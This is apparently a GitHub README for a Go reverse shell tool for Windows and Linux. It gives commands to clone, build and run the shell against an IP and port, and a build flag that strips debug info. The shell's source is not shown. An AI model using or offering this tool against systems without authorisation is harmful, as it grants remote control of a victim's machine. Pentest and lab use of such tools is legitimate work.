# go-reverse-shell
A basic shell made in go for windows and linux


## Install (linux)

```
git clone https://github.com/AssassinUKG/go-reverse-shell.git
cd go-reverse-shell
go build revshell/shell.go
./shell -i IP -P PORT
```

![image](https://user-images.githubusercontent.com/5285547/138002109-0d9108b4-2b06-46fd-a84f-219f6ec8e2cf.png)


## Build

Windows

```
go build .\shell.go
```

Linux


```
go build shell
```

## Remove debugger info. 

```
go build -ldflags "-s -w"
```
